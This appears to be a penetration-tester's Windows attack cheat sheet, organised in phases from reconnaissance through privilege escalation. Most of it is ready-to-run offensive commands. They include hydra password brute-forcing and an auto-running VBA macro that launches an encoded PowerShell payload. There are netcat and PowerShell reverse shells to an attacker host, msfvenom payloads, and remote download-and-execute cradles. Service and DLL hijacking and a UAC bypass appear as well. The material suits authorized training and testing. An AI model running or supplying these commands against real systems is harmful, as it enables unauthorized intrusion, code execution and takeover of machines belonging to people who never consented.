# Windows Methodology

Part of [[METHODOLOGY CHEAT SHEET]]. Recon → SMB/LDAP enumeration → shells → privilege escalation, phase-ordered.

---

### Phase 1: Reconnaissance

#### Step 1: Port Scanning
```bash
nmap -v -sS -sV -Pn --top-ports 1000 -oA nmap_quick <target>
nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap_full <target>
```

**What to look for**:
- SMB (139, 445) - file shares, SMB exploits
- RDP (3389) - remote desktop
- WinRM (5985, 5986) - remote management
- MSSQL (1433) - default credentials
- Web (80, 443, 8080)
- NetBIOS (137-139)

#### Step 1b: Vulnerability Scanning
> Full walkthrough (Nessus install/scan/analysis, Nmap NSE vuln scripts): [[Vulnerability Scanning]]

```bash
sudo nmap -sV -p <port> --script "vuln" <target>
```
*Same tooling and caveats as [[Linux Methodology#Step 1c: Vulnerability Scanning|Linux Methodology's Step 1c]], automated results need manual confirmation before you trust them, this matters even more on Windows targets where a flagged SMB CVE (EternalBlue, SMBGhost) can be genuinely destructive if exploited carelessly against a production-like box.*

#### Step 2: SMB Enumeration
```bash
enum4linux <target>
smbclient -U guest -L //<target>

# SMB vulnerability scan
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 <target>
```

**What to look for**:
- Shares (non-default names)
- Users (via enum4linux)
- Null sessions (SMB signing disabled)
- SMB vulnerabilities (EternalBlue, SMBGhost)

#### Step 3: Web Enumeration
> Full walkthrough (Nmap web fingerprinting, Wappalyzer, Gobuster incl. API pattern brute force, Burp Suite Proxy/Repeater/Intruder, XSS): [[Introduction to Web Application Attacks]], same techniques as [[Linux Methodology#Step 2: Web Application Enumeration|Linux Methodology's Step 2]], IIS/ASP.NET just changes the extensions and a couple of default paths.

```bash
nmap -p80 -sV <target>
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x aspx,asp,txt,config

# Proxy through Burp before manual testing, same setup as the Linux side
burpsuite   # Intercept off, browser proxy -> 127.0.0.1:8080, see [[Web Applications#Burp Suite|Command Appendix]]
```
**What to look for**: `web.config` (IIS config, sometimes leaks connection strings), `/aspnet_client/`, ViewState-based forms (`__VIEWSTATE`/`__EVENTVALIDATION` hidden fields have to ride along with every POST, scrape them fresh from the page each time).

#### Step 4: LDAP/DNS Enumeration
```bash
# DNS zone transfer
host -l domain.com <target>
nslookup
> server <target>
> ls -d domain.com

# LDAP
ldapsearch -x -H ldap://<target> -b "dc=domain,dc=com"
```

**No Kali tools available on target at all** (assumed-breach/LOLBAS scenario, e.g. handed a plain domain-joined workstation): every technique below uses only what ships on Windows by default.
```powershell
# DNS, against a specific server rather than relying on the client's own default resolver
nslookup mail.<domain>
nslookup -type=TXT info.<domain> <dns-server-ip>

# Port check (confirms open/closed, can't fingerprint a service version the way nmap does)
Test-NetConnection -Port 445 <target>

# Quick-and-dirty full port sweep, no nmap needed at all
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<target>", $_)) "TCP port $_ is open"} 2>$null

# SMTP VRFY, Test-NetConnection can only confirm the port's open, need the Telnet client to actually talk to it
dism /online /Enable-Feature /FeatureName:TelnetClient
telnet <target> 25
VRFY <username>
```
*Full explanation and worked examples for all four of these: [[Information Gathering#6.4.1. DNS Enumeration|6.4.1]] (nslookup), [[Information Gathering#6.4.3. Port Scanning with Nmap|6.4.3]] (the PowerShell port sweep, mechanics broken down in [[Reconnaissance & Enumeration (Breakdowns)#PowerShell TcpClient inline port sweep (no Nmap on target)|Command Breakdowns]]), [[Information Gathering#6.4.5. SMTP Enumeration|6.4.5]] (Telnet VRFY).*

---

### Phase 2: Initial Foothold

#### Step 1: Service Exploitation
```bash
# SMB exploits
searchsploit smb
# Try EternalBlue, SMBGhost, etc.

# Weak credentials
hydra -L users.txt -P rockyou.txt rdp://<target> -t 1
hydra -L users.txt -P rockyou.txt smb://<target> -t 4

# Web vulnerabilities
searchsploit <software> <version>
```

#### Step 1b: Client-Side Delivery (Macros / Library Files)

For internal-only targets with nothing exposed to attack directly, get a user to run something instead. See [[Client-Side Attacks#12.2. Exploiting Microsoft Office|12.2]] (Office macros) and [[Client-Side Attacks#12.3. Abusing Windows Library Files|12.3]] (Windows library files + `.lnk`).

**Office macro (VBA), scoped to the document itself, not Normal.dotm:**
```vba
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    CreateObject("Wscript.Shell").Run "<base64-encoded powershell -enc payload, chunked into <=255-char Str = Str + "..." lines>"
End Sub
```
Save as `.doc`/`.docm`, never `.docx` (won't persist the macro on save).

**Windows library file (`.Library-ms`), points Explorer at a WebDAV share:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo><folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType></templateInfo>
<searchConnectorDescriptionList><searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation><url>http://<kali_ip></url></simpleLocation>
</searchConnectorDescription></searchConnectorDescriptionList>
</libraryDescription>
```
Host the WebDAV share with `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/`, drop a `.lnk` payload (PowerShell target, PowerCat cradle) inside it, deliver the library file separately (email or a writable share via `smbclient -c 'put'`).

See [[Client-Side Attacks (Decision Tree)|Decision Tree]] for troubleshooting both, [[Client-Side Attacks (Breakdowns)|Command Breakdowns]] for the library-file XML tag-by-tag meaning.

#### Tags: #ClientSideAttacks #WindowsLibraryFiles #WordMacros #WebDAV

---

#### Step 2: Shells & Payloads

**Netcat**:
```cmd
nc <attacker_ip> 4444 -e cmd.exe
```

**PowerShell**:
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<attacker_ip>/powercat.ps1'); powercat -c <attacker_ip> -p 4444 -e powershell"
```

**MSFVenom**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o shell.exe

# Meterpreter
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o met.exe
```

#### Step 3: File Transfer
```powershell
# PowerShell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>/shell.exe', 'C:\temp\shell.exe')"

# Certutil
certutil.exe -urlcache -f http://<attacker_ip>/shell.exe C:\temp\shell.exe

# SMB
impacket-smbserver -smb2support share /var/www/html
copy \\<attacker_ip>\share\shell.exe shell.exe
```

---

### Phase 3: Privilege Escalation

#### Step 1: Quick Enumeration
```cmd
systeminfo
hostname
whoami /all
whoami /priv
net user
net localgroup
net user username
net localgroup Administrators
ipconfig /all
route print
netstat -ano
tasklist /v
wmic qfe list
wmic product get name,version
```

#### Step 2: Automated Enumeration
```powershell
# WinPEAS
iwr -uri http://<attacker_ip>/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe

# PowerUp
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
. .\PowerUp.ps1
Invoke-AllChecks
```

#### Step 3: Common Privilege Escalation Vectors

**Unquoted Service Paths**:
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
Get-UnquotedService  # PowerUp
```

**Service Binary Hijacking**:
```cmd
icacls "C:\Path\to\service.exe"
# If writable, replace with malicious binary
```

**DLL Hijacking**:
- Use Process Monitor to find missing DLLs
- Place malicious DLL in application directory

**Potato Attacks (SeImpersonatePrivilege)**:
```cmd
whoami /priv
# If SeImpersonatePrivilege enabled:
SweetPotato.exe -p whoami
```

**AlwaysInstallElevated**:
```powershell
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer
msiexec /quiet /qn /i C:\Users\Public\shell.msi
```

**UAC Bypass**:
```bash
# Metasploit
use exploit/windows/local/bypassuac_sdclt
set SESSION 1
set LHOST <attacker_ip>
run
```

**Kernel Exploits**:
```cmd
systeminfo
searchsploit windows <build_number>
```
